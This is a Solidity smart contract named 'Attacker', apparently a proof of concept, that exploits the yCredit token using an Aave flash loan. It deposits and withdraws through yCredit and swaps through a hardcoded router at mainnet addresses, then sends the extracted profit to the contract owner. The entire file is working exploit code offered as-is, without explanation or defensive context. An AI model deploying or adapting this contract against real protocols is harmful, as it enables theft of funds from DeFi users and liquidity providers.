pragma solidity >=0.8.0;
import "../interfaces/IERC20.sol";
import "hardhat/console.sol";

interface yCredit {
    function deposit(address token, uint256 amount) external;

    function withdraw(address token, uint256 amount) external;
}

interface Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract Attacker {
    address immutable owner;
    address constant aave = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    Router constant router = Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    address constant factory = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address constant ycredit = 0xE0839f9b9688a77924208aD509e29952dc660261;

    constructor() public {
        owner = msg.sender;
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        address[] memory path = new address[](2);
        for (uint256 i = 0; i < assets.length; i++) {
            // 1. deposit asset to ycredit
            IERC20(assets[i]).approve(ycredit, amounts[i] / 2);
            yCredit(ycredit).deposit(assets[i], amounts[i] / 2);
            // 2. swap token for ycredit
            path[0] = assets[i];
            path[1] = ycredit;
            IERC20(assets[i]).approve(address(router), amounts[i] / 2);
            router.swapExactTokensForTokens(
                amounts[i] / 2,
                0,
                path,
                address(this),
                type(uint256).max
            );
            // 3. withdraw from ycredit
            yCredit(ycredit).withdraw(
                assets[i],
                IERC20(ycredit).balanceOf(address(this))
            );
            // 4. swap ycredit to asset
            path[0] = ycredit;
            path[1] = assets[i];
            uint256 amountIn = IERC20(ycredit).balanceOf(address(this));
            IERC20(ycredit).approve(address(router), amountIn);
            router.swapExactTokensForTokens(
                amountIn,
                0,
                path,
                address(this),
                type(uint256).max
            );
            // 5. return the profits
            uint256 profit =
                IERC20(assets[i]).balanceOf(address(this)) -
                    amounts[i] -
                    premiums[i];
            console.log(profit);
            IERC20(assets[i]).transfer(owner, profit);
            // 6. return the flash loan
            IERC20(assets[i]).approve(address(aave), amounts[i] + premiums[i]);
            return true;
        }
    }
}
